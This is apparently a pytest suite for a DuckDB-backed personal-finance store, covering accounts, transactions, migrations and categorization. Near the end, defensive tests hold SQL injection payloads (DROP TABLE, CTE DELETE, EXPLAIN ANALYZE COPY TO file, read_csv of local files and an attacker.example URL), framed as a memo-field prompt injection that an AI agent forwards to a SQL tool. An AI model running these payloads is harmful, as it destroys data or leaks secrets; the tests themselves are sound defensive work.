from __future__ import annotations

from datetime import UTC, date, datetime, timedelta
from decimal import Decimal
from pathlib import Path

import pytest

from goetta_finance.errors import StoreError
from goetta_finance.models import (
    Account,
    AccountType,
    BalanceSnapshot,
    GoalDirection,
    GoalKind,
    GoalPeriod,
    SyncRun,
    Transaction,
)
from goetta_finance.store.duckdb_store import DuckDBStore


def _utc(year: int, month: int, day: int, hour: int = 12) -> datetime:
    return datetime(year, month, day, hour, tzinfo=UTC)


def _account(id: str = "acc-1", balance: str = "100.00") -> Account:
    return Account(
        id=id,
        org_id="org-1",
        org_name="Test Bank",
        name="Checking 1234",
        currency="USD",
        balance=Decimal(balance),
        available_balance=Decimal(balance),
        balance_date=_utc(2026, 5, 1),
        type=AccountType.CHECKING,
        extra={"foo": "bar"},
    )


def _transaction(id: str, amount: str = "-9.99", account_id: str = "acc-1") -> Transaction:
    return Transaction(
        id=id,
        account_id=account_id,
        posted=_utc(2026, 5, 10),
        amount=Decimal(amount),
        description="Coffee shop",
        payee="Coffee shop",
    )


def test_init_applies_migrations(store: DuckDBStore) -> None:
    rows = store.conn.execute("SELECT name FROM schema_migrations").fetchall()
    assert ("0001_init.sql",) in rows


def test_init_is_idempotent(store: DuckDBStore) -> None:
    before_row = store.conn.execute("SELECT COUNT(*) FROM schema_migrations").fetchone()
    assert before_row is not None
    before = before_row[0]
    store.init()
    store.init()
    after_row = store.conn.execute("SELECT COUNT(*) FROM schema_migrations").fetchone()
    assert after_row is not None and after_row[0] == before


def test_upsert_and_get_accounts_round_trip(store: DuckDBStore) -> None:
    acc = _account()
    store.upsert_accounts([acc])
    fetched = store.get_accounts()
    assert len(fetched) == 1
    got = fetched[0]
    assert got.id == acc.id
    assert got.balance == Decimal("100.00")
    assert got.type == AccountType.CHECKING
    assert got.balance_date == _utc(2026, 5, 1)
    assert got.extra == {"foo": "bar"}


def test_upsert_accounts_updates_existing(store: DuckDBStore) -> None:
    store.upsert_accounts([_account(balance="100.00")])
    store.upsert_accounts([_account(balance="250.50")])
    fetched = store.get_accounts()
    assert len(fetched) == 1
    assert fetched[0].balance == Decimal("250.50")


def test_upsert_transactions_counts_new_vs_updated(store: DuckDBStore) -> None:
    store.upsert_accounts([_account()])
    result = store.upsert_transactions([_transaction("t1"), _transaction("t2")])
    assert result.new == 2
    assert result.updated == 0

    result2 = store.upsert_transactions([_transaction("t1"), _transaction("t3")])
    assert result2.new == 1
    assert result2.updated == 1

    txns = store.get_transactions()
    assert {t.id for t in txns} == {"t1", "t2", "t3"}


def test_upsert_transactions_is_idempotent(store: DuckDBStore) -> None:
    store.upsert_accounts([_account()])
    batch = [_transaction(f"t{i}") for i in range(5)]
    store.upsert_transactions(batch)
    store.upsert_transactions(batch)
    count_row = store.conn.execute("SELECT COUNT(*) FROM transactions").fetchone()
    assert count_row is not None and count_row[0] == 5


def test_balance_snapshot_dedup(store: DuckDBStore) -> None:
    store.upsert_accounts([_account()])
    ts = _utc(2026, 5, 1)
    snap = BalanceSnapshot(account_id="acc-1", balance=Decimal("100.00"), timestamp=ts)
    store.record_balance_snapshot(snap)
    store.record_balance_snapshot(snap)
    history = store.get_balance_history("acc-1", since=_utc(2026, 1, 1))
    assert len(history) == 1
    assert history[0].balance == Decimal("100.00")
    assert history[0].timestamp == ts


def test_record_sync_run_and_last_sync_time(store: DuckDBStore) -> None:
    assert store.last_sync_time() is None

    started = _utc(2026, 5, 1, 6)
    finished = started + timedelta(minutes=2)
    run_id = store.record_sync_run(
        SyncRun(
            started_at=started,
            finished_at=finished,
            accounts_touched=3,
            transactions_new=10,
            transactions_updated=2,
            warnings=["a bank was slow"],
        )
    )
    assert run_id == 1
    assert store.last_sync_time() == finished


def test_get_transactions_filters(store: DuckDBStore) -> None:
    store.upsert_accounts([_account("a1"), _account("a2")])
    txns = [
        Transaction(
            id="t-a1-early",
            account_id="a1",
            posted=_utc(2026, 1, 15),
            amount=Decimal("-1.00"),
            description="x",
        ),
        Transaction(
            id="t-a1-late",
            account_id="a1",
            posted=_utc(2026, 5, 15),
            amount=Decimal("-2.00"),
            description="x",
        ),
        Transaction(
            id="t-a2-late",
            account_id="a2",
            posted=_utc(2026, 5, 16),
            amount=Decimal("-3.00"),
            description="x",
        ),
    ]
    store.upsert_transactions(txns)

    by_account = store.get_transactions(account_id="a1")
    assert {t.id for t in by_account} == {"t-a1-early", "t-a1-late"}

    by_date = store.get_transactions(start=_utc(2026, 5, 1))
    assert {t.id for t in by_date} == {"t-a1-late", "t-a2-late"}

    limited = store.get_transactions(limit=1)
    assert len(limited) == 1


@pytest.mark.parametrize(
    "sql",
    [
        "INSERT INTO accounts (id, name, balance, balance_date) VALUES ('x','x',0,now())",
        "UPDATE accounts SET name='x'",
        "DELETE FROM accounts",
        "CREATE TABLE evil (id INT)",
        "DROP TABLE accounts",
        "ALTER TABLE accounts ADD COLUMN evil INT",
        "SELECT 1; DROP TABLE accounts",
    ],
)
def test_query_sql_rejects_writes(store: DuckDBStore, sql: str) -> None:
    with pytest.raises(StoreError):
        store.query_sql(sql)


def test_query_sql_allows_select(store: DuckDBStore) -> None:
    store.upsert_accounts([_account()])
    result = store.query_sql("SELECT id, balance FROM accounts ORDER BY id")
    assert result == [{"id": "acc-1", "balance": Decimal("100.00")}]


def test_query_sql_strips_comments(store: DuckDBStore) -> None:
    rows = store.query_sql("-- comment\nSELECT 1 AS one")
    assert rows == [{"one": 1}]


def _manual_account(id: str = "MANUAL-abc123", balance: str = "30000.00") -> Account:
    return Account(
        id=id,
        org_id=None,
        org_name="Apple",
        name="Apple Savings",
        currency="USD",
        balance=Decimal(balance),
        available_balance=None,
        balance_date=_utc(2026, 5, 17),
        type=AccountType.SAVINGS,
        extra={},
        is_manual=True,
    )


def test_migration_0002_backward_compat_default_false(store: DuckDBStore) -> None:
    """Existing-style upsert (no is_manual specified) defaults to FALSE.

    Proves the 0002 migration applied with the right default and that callers
    written against the pre-0002 schema (no is_manual in the Account model)
    are not broken — they continue to write non-manual rows transparently.
    """
    rows = store.conn.execute("SELECT name FROM schema_migrations").fetchall()
    assert ("0002_manual_accounts.sql",) in rows
    store.upsert_accounts([_account()])
    fetched = store.get_accounts()
    assert len(fetched) == 1
    assert fetched[0].is_manual is False


def test_upsert_manual_account_round_trip(store: DuckDBStore) -> None:
    store.upsert_accounts([_manual_account()])
    fetched = store.get_accounts()
    assert len(fetched) == 1
    got = fetched[0]
    assert got.id == "MANUAL-abc123"
    assert got.is_manual is True
    assert got.balance == Decimal("30000.00")
    assert got.name == "Apple Savings"


def test_upsert_refuses_to_clobber_manual_with_simplefin_data(store: DuckDBStore) -> None:
    """Pin the data-integrity outcome, not the mechanism.

    Seeds a manual account, attempts to upsert non-manual data with the same
    id, then asserts both (a) the call raised StoreError AND (b) the stored
    row's name, balance, and is_manual are unchanged. A future refactor that
    moves the check to a different layer but preserves data integrity passes;
    a refactor that drops the check silently fails because the row got
    clobbered.
    """
    manual = _manual_account(id="MANUAL-shared-id", balance="30000.00")
    store.upsert_accounts([manual])

    simplefin_collision = _account(id="MANUAL-shared-id", balance="0.01")
    assert simplefin_collision.is_manual is False
    with pytest.raises(StoreError):
        store.upsert_accounts([simplefin_collision])

    fetched = store.get_accounts()
    assert len(fetched) == 1
    survived = fetched[0]
    assert survived.is_manual is True, "manual flag was clobbered"
    assert survived.balance == Decimal("30000.00"), "balance was clobbered"
    assert survived.name == "Apple Savings", "name was clobbered"


def test_delete_account_refuses_non_manual(store: DuckDBStore) -> None:
    store.upsert_accounts([_account()])
    with pytest.raises(StoreError, match="non-manual"):
        store.delete_account("acc-1")
    assert {a.id for a in store.get_accounts()} == {"acc-1"}


def test_delete_account_not_found(store: DuckDBStore) -> None:
    with pytest.raises(StoreError, match="not found"):
        store.delete_account("MANUAL-does-not-exist")


def test_delete_account_refuses_when_snapshots_exist_without_cascade(
    store: DuckDBStore,
) -> None:
    store.upsert_accounts([_manual_account()])
    store.record_balance_snapshot(
        BalanceSnapshot(
            account_id="MANUAL-abc123",
            balance=Decimal("30000.00"),
            timestamp=_utc(2026, 5, 17),
        )
    )
    with pytest.raises(StoreError, match="balance snapshots"):
        store.delete_account("MANUAL-abc123", cascade_snapshots=False)
    assert {a.id for a in store.get_accounts()} == {"MANUAL-abc123"}


def test_delete_account_cascades_snapshots(store: DuckDBStore) -> None:
    store.upsert_accounts([_manual_account()])
    for day in (1, 8, 15):
        store.record_balance_snapshot(
            BalanceSnapshot(
                account_id="MANUAL-abc123",
                balance=Decimal("30000.00"),
                timestamp=_utc(2026, 5, day),
            )
        )
    deleted = store.delete_account("MANUAL-abc123", cascade_snapshots=True)
    assert deleted == 3
    assert store.get_accounts() == []
    remaining = store.conn.execute(
        "SELECT COUNT(*) FROM balance_snapshots WHERE account_id = ?",
        ["MANUAL-abc123"],
    ).fetchone()
    assert remaining is not None and remaining[0] == 0


def test_delete_account_returns_zero_when_no_snapshots(store: DuckDBStore) -> None:
    store.upsert_accounts([_manual_account()])
    deleted = store.delete_account("MANUAL-abc123")
    assert deleted == 0
    assert store.get_accounts() == []


def test_migration_0003_backward_compat_default_false(store: DuckDBStore) -> None:
    """0003 backward-compat — existing-style upsert (no is_liability) defaults to FALSE."""
    rows = store.conn.execute("SELECT name FROM schema_migrations").fetchall()
    assert ("0003_liabilities.sql",) in rows
    store.upsert_accounts([_account()])
    fetched = store.get_accounts()
    assert len(fetched) == 1
    assert fetched[0].is_liability is False


def test_upsert_liability_round_trip(store: DuckDBStore) -> None:
    store.upsert_accounts(
        [
            Account(
                id="MANUAL-loan-1",
                org_name="Dept of Education",
                name="Federal Student Loans",
                balance=Decimal("22500.00"),
                balance_date=_utc(2026, 5, 1),
                type=AccountType.LOAN,
                is_manual=True,
                is_liability=True,
            )
        ]
    )
    fetched = store.get_accounts()
    assert len(fetched) == 1
    assert fetched[0].is_liability is True
    assert fetched[0].is_manual is True


def test_set_account_liability_flips_flag_on_manual(store: DuckDBStore) -> None:
    store.upsert_accounts([_manual_account()])
    assert store.get_accounts()[0].is_liability is False
    store.set_account_liability("MANUAL-abc123", True)
    assert store.get_accounts()[0].is_liability is True
    store.set_account_liability("MANUAL-abc123", False)
    assert store.get_accounts()[0].is_liability is False


def test_set_account_liability_works_on_simplefin_account(store: DuckDBStore) -> None:
    """is_liability is settable on any account id, not just manual ones.

    Real motivation: SimpleFIN credit cards that the user wants explicitly
    flagged as liabilities even though their balance is already negative
    (so the math doesn't strictly require the flag — but the dashboard
    badge and any future asset/liability split do).
    """
    store.upsert_accounts([_account(id="ACT-real-cc")])
    store.set_account_liability("ACT-real-cc", True)
    fetched = store.get_accounts()
    assert fetched[0].id == "ACT-real-cc"
    assert fetched[0].is_liability is True


def test_set_account_liability_raises_on_unknown_id(store: DuckDBStore) -> None:
    with pytest.raises(StoreError, match="not found"):
        store.set_account_liability("MANUAL-does-not-exist", True)


# --- 0005: hidden accounts + user-owned-flag preservation -------------------


def test_migration_0005_applied(store: DuckDBStore) -> None:
    rows = store.conn.execute("SELECT name FROM schema_migrations").fetchall()
    assert ("0005_hidden_accounts.sql",) in rows


def test_migration_0005_backward_compat_default_false(store: DuckDBStore) -> None:
    """Existing-style upsert (no is_hidden specified) defaults to FALSE."""
    store.upsert_accounts([_account()])
    fetched = store.get_accounts()
    assert len(fetched) == 1
    assert fetched[0].is_hidden is False


def test_set_account_hidden_round_trip(store: DuckDBStore) -> None:
    store.upsert_accounts([_account(id="ACT-hide-me")])
    assert store.get_accounts()[0].is_hidden is False
    store.set_account_hidden("ACT-hide-me", True)
    # Hidden by default → filtered out of get_accounts().
    visible = store.get_accounts()
    assert visible == []
    # include_hidden=True surfaces it again.
    all_accounts = store.get_accounts(include_hidden=True)
    assert len(all_accounts) == 1
    assert all_accounts[0].is_hidden is True


def test_set_account_hidden_raises_on_unknown_id(store: DuckDBStore) -> None:
    with pytest.raises(StoreError, match="not found"):
        store.set_account_hidden("ACT-does-not-exist", True)


def test_user_owned_flags_survive_sync(store: DuckDBStore) -> None:
    """The class-of-bug regression. is_liability AND is_hidden are
    user-controlled — they must NOT be overwritten when a sync runs
    and re-upserts the account with the parser's natural False
    defaults.

    Pins the conceptual fix, not just the two current flags. A future
    user-controlled boolean that lands in _SIMPLEFIN_SOURCED_COLUMNS
    by mistake (instead of _USER_OWNED_COLUMNS) and gets enumerated
    in the SET clause would also fail this test."""
    # 1. Insert a SimpleFIN-style account.
    store.upsert_accounts([_account(id="ACT-user-owned-test")])

    # 2. User flips both user-owned flags TRUE.
    store.set_account_liability("ACT-user-owned-test", True)
    store.set_account_hidden("ACT-user-owned-test", True)

    # 3. Sync re-upserts with the parser's natural False defaults
    #    — same path collect() takes after a fresh SimpleFIN response.
    #    Also change balance to prove SimpleFIN-sourced columns DO
    #    still update.
    store.upsert_accounts([_account(id="ACT-user-owned-test", balance="250.50")])

    # 4. Both user-owned flags survive; SimpleFIN-sourced columns update.
    after = next(
        a for a in store.get_accounts(include_hidden=True) if a.id == "ACT-user-owned-test"
    )
    assert after.is_liability is True, (
        "is_liability was clobbered by sync — _USER_OWNED_COLUMNS likely "
        "missing from the upsert SET-clause exclusion"
    )
    assert after.is_hidden is True, (
        "is_hidden was clobbered by sync — _USER_OWNED_COLUMNS likely "
        "missing from the upsert SET-clause exclusion"
    )
    assert after.balance == Decimal("250.50"), (
        "balance should still update on sync — SimpleFIN-sourced columns "
        "are intended to be overwritten"
    )


def test_get_accounts_filters_hidden_by_default(store: DuckDBStore) -> None:
    store.upsert_accounts([_account(id="ACT-visible"), _account(id="ACT-hidden-one")])
    store.set_account_hidden("ACT-hidden-one", True)
    visible = store.get_accounts()
    assert {a.id for a in visible} == {"ACT-visible"}


def test_get_accounts_include_hidden_returns_all(store: DuckDBStore) -> None:
    store.upsert_accounts([_account(id="ACT-visible"), _account(id="ACT-hidden-one")])
    store.set_account_hidden("ACT-hidden-one", True)
    all_accounts = store.get_accounts(include_hidden=True)
    assert {a.id for a in all_accounts} == {"ACT-visible", "ACT-hidden-one"}


def test_view_exposes_account_is_hidden(store: DuckDBStore) -> None:
    store.upsert_accounts([_account(id="acc-cat")])
    store.upsert_transactions([_txn("t-view", "ZZZ")])
    rows = store.conn.execute(
        "SELECT id, account_is_hidden FROM transactions_with_category WHERE id = ?",
        ["t-view"],
    ).fetchall()
    assert len(rows) == 1
    assert rows[0][1] is False or rows[0][1] == 0  # DuckDB BOOL→Python


def test_view_returns_all_transactions_after_account_join(
    store: DuckDBStore,
) -> None:
    """Pin the LEFT-JOIN-to-JOIN change in 0005 doesn't silently drop
    rows. The "every transaction has an account" invariant is enforced
    by the FK constraint today; this test catches a future regression
    (nullable FK, broken fixture, etc.) that would shrink the
    dashboard's transaction count."""
    store.upsert_accounts([_account(id="acc-join-test")])
    store.upsert_transactions(
        [
            Transaction(
                id=f"t-join-{i}",
                account_id="acc-join-test",
                posted=_utc(2026, 5, i + 1),
                amount=Decimal("-1.00"),
                description=f"ZZZ-{i}",
            )
            for i in range(5)
        ]
    )
    txn_count = store.conn.execute("SELECT COUNT(*) FROM transactions").fetchone()
    view_count = store.conn.execute("SELECT COUNT(*) FROM transactions_with_category").fetchone()
    assert txn_count is not None and view_count is not None
    assert txn_count[0] == view_count[0] == 5


def test_get_transactions_filters_hidden_account_by_default(
    store: DuckDBStore,
) -> None:
    store.upsert_accounts([_account(id="acc-vis"), _account(id="acc-hid")])
    store.upsert_transactions(
        [
            _txn("t-vis", "VISIBLE", account_id="acc-vis"),
            _txn("t-hid", "HIDDEN-ACCT", account_id="acc-hid"),
        ]
    )
    store.set_account_hidden("acc-hid", True)
    visible = store.get_transactions()
    assert {t.id for t in visible} == {"t-vis"}


def test_get_transactions_include_hidden_returns_all(store: DuckDBStore) -> None:
    store.upsert_accounts([_account(id="acc-vis"), _account(id="acc-hid")])
    store.upsert_transactions(
        [
            _txn("t-vis", "VISIBLE", account_id="acc-vis"),
            _txn("t-hid", "HIDDEN-ACCT", account_id="acc-hid"),
        ]
    )
    store.set_account_hidden("acc-hid", True)
    all_txns = store.get_transactions(include_hidden=True)
    assert {t.id for t in all_txns} == {"t-vis", "t-hid"}


def test_get_transactions_with_category_filters_hidden_by_default(
    store: DuckDBStore,
) -> None:
    store.upsert_accounts([_account(id="acc-vis"), _account(id="acc-hid")])
    store.upsert_transactions(
        [
            _txn("t-vis", "VISIBLE", account_id="acc-vis"),
            _txn("t-hid", "STARBUCKS STORE", account_id="acc-hid"),
        ]
    )
    store.set_account_hidden("acc-hid", True)
    rows = store.get_transactions_with_category()
    assert {r["id"] for r in rows} == {"t-vis"}


# --- Regression: whitelist-bypassing payloads must still be refused. ---
#
# Scenario: a transaction memo or payee field carries injected SQL. Claude
# reads that field while answering an unrelated question and forwards it to
# sql_query. The leading token (WITH / EXPLAIN) is whitelisted by design —
# these are legitimate analytical prefixes — so the read-only transaction is
# what actually has to stop the embedded mutation.


def test_query_sql_rejects_with_cte_delete(store: DuckDBStore) -> None:
    store.upsert_accounts([_account("victim")])
    with pytest.raises(StoreError):
        store.query_sql("WITH cte AS (SELECT 1) DELETE FROM accounts WHERE id = 'victim'")
    survivors = store.get_accounts()
    assert any(a.id == "victim" for a in survivors)


def test_query_sql_rejects_explain_analyze_insert(store: DuckDBStore) -> None:
    before = len(store.get_accounts())
    with pytest.raises(StoreError):
        store.query_sql(
            "EXPLAIN ANALYZE INSERT INTO accounts "
            "(id, name, balance, balance_date) "
            "VALUES ('injected', 'x', 0, now())"
        )
    after = len(store.get_accounts())
    assert before == after, "EXPLAIN ANALYZE INSERT must not write a row"


def test_query_sql_rejects_explain_analyze_copy_to_file(store: DuckDBStore, tmp_path: Path) -> None:
    """EXPLAIN ANALYZE COPY (SELECT 1) TO 'file' actually runs the COPY,
    writing the file. The read-only transaction does NOT block this
    because COPY writes the filesystem, not the database. The prefix
    whitelist is what stops it — by excluding ``explain`` entirely.

    Pin the *outcome*, not the mechanism: even if a future change
    re-adds ``explain`` to the whitelist (or a clever EXPLAIN variant
    slips through), the file must not appear.
    """
    leak = tmp_path / "leak.csv"
    assert not leak.exists()
    with pytest.raises(StoreError):
        store.query_sql(f"EXPLAIN ANALYZE COPY (SELECT 1) TO '{leak.as_posix()}'")
    assert not leak.exists(), (
        f"EXPLAIN ANALYZE COPY must not write to the filesystem, but "
        f"{leak} appeared. The prefix whitelist failed to reject "
        f"`explain` and the read-only transaction does not stop COPY ... "
        f"TO file."
    )


def test_query_sql_blocks_external_file_read(store: DuckDBStore, tmp_path: Path) -> None:
    """``SELECT * FROM read_csv('any/path')`` is the information-disclosure
    counterpart to the mutation vectors above: a memo-injection payload
    could trick the agent into reading arbitrary local files (e.g.
    ``~/.ssh/id_rsa``). The pre-flight whitelist passes it (``select``
    is allowed) and the read-only transaction doesn't bound the
    filesystem. The DuckDB connection's ``enable_external_access=false``
    setting is what stops it.

    Pin the outcome (no leak), not the mechanism (no assertion on the
    specific error wording). Belt-and-suspenders: the unique sentinel
    content must not surface in the error chain either, in case a
    future DuckDB version echoes file contents in error messages.
    """
    sentinel = tmp_path / "sentinel.txt"
    secret = "do-not-leak-this-uuid-deadbeef-cafe-9988"
    sentinel.write_text(secret + "\n", encoding="utf-8")

    with pytest.raises(StoreError) as exc_info:
        store.query_sql(f"SELECT * FROM read_csv('{sentinel.as_posix()}')")

    chain = str(exc_info.value)
    cause = exc_info.value.__cause__
    if cause is not None:
        chain += " " + str(cause)
    assert secret not in chain, (
        "DuckDB error must not echo the sentinel file contents back through the exception chain"
    )


def test_query_sql_blocks_http_url_read(store: DuckDBStore) -> None:
    """Same control covers the network-exfiltration variant: a payload
    like ``SELECT * FROM read_csv('https://attacker.example/log?d=...')``
    would be a beacon-out vector if external access were enabled. Pin the
    outcome (no network attempt reaches DuckDB's httpfs)."""
    with pytest.raises(StoreError):
        store.query_sql("SELECT * FROM read_csv('https://example.invalid/x.csv')")


def test_query_sql_leaves_connection_in_clean_state(store: DuckDBStore) -> None:
    """A rejected query must not leave the read-only transaction open;
    subsequent writes on the same connection must still succeed."""
    store.upsert_accounts([_account("a1")])
    with pytest.raises(StoreError):
        store.query_sql("WITH cte AS (SELECT 1) DELETE FROM accounts WHERE id = 'a1'")
    # If the transaction were still open in read-only mode this would fail.
    store.upsert_accounts([_account("a2", balance="42.00")])
    ids = {a.id for a in store.get_accounts()}
    assert {"a1", "a2"} <= ids


def test_read_only_store_can_read_but_not_write(store: DuckDBStore, tmp_path: Path) -> None:
    """A second DuckDBStore opened with read_only=True against the same
    file must see the data but refuse any write attempt."""
    store.upsert_accounts([_account("a1", balance="100.00")])
    store.close()  # release the writer handle so the OS-level lock is free

    ro_store = DuckDBStore(store.path, read_only=True)
    try:
        ro_store.init()  # must be a no-op, not a migration attempt
        accounts = ro_store.get_accounts()
        assert {a.id for a in accounts} == {"a1"}

        import duckdb

        with pytest.raises(duckdb.Error):
            ro_store.upsert_accounts([_account("a2")])
    finally:
        ro_store.close()


def test_read_only_store_query_sql_still_works(store: DuckDBStore) -> None:
    store.upsert_accounts([_account("a1", balance="42.00")])
    store.close()

    ro_store = DuckDBStore(store.path, read_only=True)
    try:
        rows = ro_store.query_sql("SELECT id, balance FROM accounts")
        assert rows == [{"id": "a1", "balance": Decimal("42.00")}]
    finally:
        ro_store.close()


# --- query_sql resource-limit hardening (Security audit 2026-05) ---


def test_query_sql_memory_limit_bounds_huge_intermediate(store: DuckDBStore) -> None:
    """A query that would allocate well past the 512MB connect-time cap
    must fail with a DuckDB out-of-memory error rather than OOM-killing
    the daemon. Either ``memory_limit`` or the timeout watchdog catches
    this — both are acceptable bounded failures vs. an OOM-kill."""
    with pytest.raises(StoreError) as exc_info:
        store.query_sql("SELECT count(*) FROM range(0, 10000000000) t1, range(0, 1000) t2")
    msg = str(exc_info.value).lower()
    assert "memory" in msg or "interrupt" in msg or "cancel" in msg, (
        f"unexpected error message: {exc_info.value!r}"
    )


def test_query_sql_timeout_interrupts_long_running(
    store: DuckDBStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A query running past the watchdog timeout must be interrupted.
    Sets a 1s timeout via env var so the test stays fast."""
    monkeypatch.setenv("GOETTA_FINANCE_SQL_TIMEOUT_SECONDS", "1")
    with pytest.raises(StoreError) as exc_info:
        store.query_sql("SELECT count(*) FROM range(0, 100000000000)")
    msg = str(exc_info.value).lower()
    assert "interrupt" in msg or "cancel" in msg or "timeout" in msg, (
        f"timeout did not interrupt cleanly; got: {exc_info.value!r}"
    )


def test_query_sql_normal_query_unaffected_by_resource_limits(
    store: DuckDBStore,
) -> None:
    """Regression: small SELECTs must still work after the memory_limit /
    threads / timeout hardening lands. If this goes red the limits are
    set too tight or the watchdog is firing on legitimate queries."""
    store.upsert_accounts([_account("acc-resource-1", balance="100.00")])
    rows = store.query_sql("SELECT id, balance FROM accounts WHERE id = ?", ["acc-resource-1"])
    assert rows == [{"id": "acc-resource-1", "balance": Decimal("100.00")}]


def test_query_sql_params_binding_for_internal_callers(store: DuckDBStore) -> None:
    """``query_sql`` accepts optional positional params so internal callers
    (web/aggregations.py) can bind values instead of interpolating them
    into the SQL string. Closes the bandit B608 / ruff S608 class of
    finding at the call sites without weakening the read-only transaction
    wrapper."""
    store.upsert_accounts([_account("a1", balance="10.00"), _account("a2", balance="20.00")])
    rows = store.query_sql(
        "SELECT id, balance FROM accounts WHERE id = ? ORDER BY id",
        ["a2"],
    )
    assert rows == [{"id": "a2", "balance": Decimal("20.00")}]


# --- Categorization (migration 0004). Outcome-pinning, same shape as 0003. ---
#
# Resolution is read-time via the ``transactions_with_category`` view:
# override > first-matching-rule-by-priority > 'Uncategorized'. The tests
# pin the *outcome* (what category the view returns), not the mechanism
# (which join, which CTE), so a future swap of ROW_NUMBER for a
# correlated subquery is invisible to the test suite.


def _txn(
    id: str,
    description: str,
    *,
    account_id: str = "acc-cat",
    amount: str = "-9.99",
    posted: datetime | None = None,
) -> Transaction:
    return Transaction(
        id=id,
        account_id=account_id,
        posted=posted or _utc(2026, 5, 10),
        amount=Decimal(amount),
        description=description,
    )


def _seed_cat_account(store: DuckDBStore) -> None:
    store.upsert_accounts([_account(id="acc-cat", balance="100.00")])


def test_migration_0007_applied(store_no_legacy_rules: DuckDBStore) -> None:
    rows = store_no_legacy_rules.conn.execute("SELECT name FROM schema_migrations").fetchall()
    assert ("0007_demote_default_rules.sql",) in rows


def test_migration_0007_keeps_only_universal_default_rules(
    store_no_legacy_rules: DuckDBStore,
) -> None:
    """The surviving default rules after 0007 are the universal set:
    `(?i)transfer` regex + 5 global subscriptions. Pins the editorial
    decision so a future "let's add KROGER back" change has to
    confront the principle (per feedback_stranger_test_for_open_source).
    """
    rows = store_no_legacy_rules.conn.execute(
        """
        SELECT match_type, pattern
        FROM category_rules
        WHERE is_default = TRUE
        ORDER BY match_type, pattern
        """
    ).fetchall()
    survivors = {(r[0], r[1]) for r in rows}
    assert survivors == {
        ("contains", "AMAZON PRIME"),
        ("contains", "DISNEY PLUS"),
        ("contains", "HULU"),
        ("contains", "NETFLIX"),
        ("contains", "SPOTIFY"),
        ("regex", "(?i)transfer"),
    }


def test_migration_0006_applied(store: DuckDBStore) -> None:
    """Pin migration 0006 (is_spending flag on categories)."""
    rows = store.conn.execute("SELECT name FROM schema_migrations").fetchall()
    assert ("0006_spending_flag.sql",) in rows


def test_default_non_spending_categories_seeded(store: DuckDBStore) -> None:
    """Transfers and Income default to is_spending=FALSE; all others
    default to TRUE. Migration 0006's UPDATE clause is the contract."""
    cats = {c.name: c for c in store.get_categories()}
    assert cats["Transfers"].is_spending is False
    assert cats["Income"].is_spending is False
    assert cats["Dining"].is_spending is True
    assert cats["Groceries"].is_spending is True
    assert cats["Uncategorized"].is_spending is True


def test_add_category_honors_is_spending_flag(store: DuckDBStore) -> None:
    """add_category(is_spending=False) writes a non-spending row."""
    cat = store.add_category("PayrollDeduction", is_spending=False)
    assert cat.is_spending is False
    refetched = {c.name: c for c in store.get_categories()}
    assert refetched["PayrollDeduction"].is_spending is False


def test_add_category_defaults_to_spending(store: DuckDBStore) -> None:
    cat = store.add_category("MyNewCat")
    assert cat.is_spending is True


def test_set_category_spending_toggle(store: DuckDBStore) -> None:
    """Round-trip: flip Dining to non-spending and back."""
    store.set_category_spending("Dining", False)
    cats = {c.name: c for c in store.get_categories()}
    assert cats["Dining"].is_spending is False
    store.set_category_spending("Dining", True)
    cats = {c.name: c for c in store.get_categories()}
    assert cats["Dining"].is_spending is True


def test_set_category_spending_case_insensitive(store: DuckDBStore) -> None:
    """Matches the case-insensitive resolution pattern used elsewhere
    for category lookups (add_rule, set_transaction_override)."""
    store.set_category_spending("dining", False)
    cats = {c.name: c for c in store.get_categories()}
    assert cats["Dining"].is_spending is False


def test_set_category_spending_raises_on_unknown_name(store: DuckDBStore) -> None:
    with pytest.raises(StoreError, match="not found"):
        store.set_category_spending("NoSuchCategory", False)


def test_migration_0004_applied(store: DuckDBStore) -> None:
    """Pin the migration filename so re-runs of init() stay idempotent
    and so renaming the file forces a deliberate test update."""
    rows = store.conn.execute("SELECT name FROM schema_migrations").fetchall()
    assert ("0004_categorization.sql",) in rows


def test_default_categories_seeded(store: DuckDBStore) -> None:
    """Pin the default-category count and the presence of the load-bearing
    names that other modules / docs depend on."""
    cats = store.get_categories()
    names = {c.name for c in cats}
    expected = {
        "Groceries",
        "Dining",
        "Transportation",
        "Gas",
        "Utilities",
        "Subscriptions",
        "Rent/Mortgage",
        "Healthcare",
        "Entertainment",
        "Shopping",
        "Travel",
        "Transfers",
        "Income",
        "Uncategorized",
    }
    assert expected <= names, f"missing default categories: {expected - names}"
    assert all(c.is_default for c in cats if c.name in expected)


def test_view_returns_uncategorized_when_no_match(store: DuckDBStore) -> None:
    _seed_cat_account(store)
    store.upsert_transactions([_txn("t-gibberish", "ZZZQQQ unmatched payee")])
    rows = store.get_transactions_with_category()
    assert len(rows) == 1
    assert rows[0]["category"] == "Uncategorized"


def test_view_returns_rule_match(store: DuckDBStore) -> None:
    """A STARBUCKS transaction resolves to Dining via the default rule."""
    _seed_cat_account(store)
    store.upsert_transactions([_txn("t-sbux", "STARBUCKS STORE #1234")])
    rows = store.get_transactions_with_category(category="Dining")
    assert len(rows) == 1
    assert rows[0]["id"] == "t-sbux"
    assert rows[0]["category"] == "Dining"


def test_view_override_beats_rule(store: DuckDBStore) -> None:
    """Override wins over a matching rule. Same Starbucks txn, override
    to Shopping → view returns Shopping."""
    _seed_cat_account(store)
    store.upsert_transactions([_txn("t-sbux", "STARBUCKS STORE #1234")])
    store.set_transaction_override("t-sbux", "Shopping")
    rows = store.get_transactions_with_category()
    assert len(rows) == 1
    assert rows[0]["category"] == "Shopping"


def test_view_rule_priority_lowest_wins(store: DuckDBStore) -> None:
    """When two rules match, the one with lower priority number wins."""
    _seed_cat_account(store)
    store.upsert_transactions([_txn("t-ambiguous", "AMAZON.COM SUBSCRIBE")])
    # The default seed has 'AMAZON.COM' → Shopping at priority 50 and
    # 'AMAZON PRIME' → Subscriptions at priority 20. Add a third rule
    # at priority 10 to make the test independent of default-seed
    # priorities.
    store.add_rule("Dining", match_type="contains", pattern="AMAZON.COM SUBSCRIBE", priority=5)
    rows = store.get_transactions_with_category()
    assert rows[0]["category"] == "Dining"


def test_set_transaction_override_writes_row(store: DuckDBStore) -> None:
    _seed_cat_account(store)
    store.upsert_transactions([_txn("t-1", "ZZZ unmatched")])
    store.set_transaction_override("t-1", "Dining")
    rows = store.conn.execute(
        "SELECT category_id FROM transaction_overrides WHERE transaction_id = ?",
        ["t-1"],
    ).fetchall()
    assert len(rows) == 1


def test_set_transaction_override_upsert_replaces(store: DuckDBStore) -> None:
    """Calling set_transaction_override twice on the same txn replaces
    the override, doesn't insert a duplicate row."""
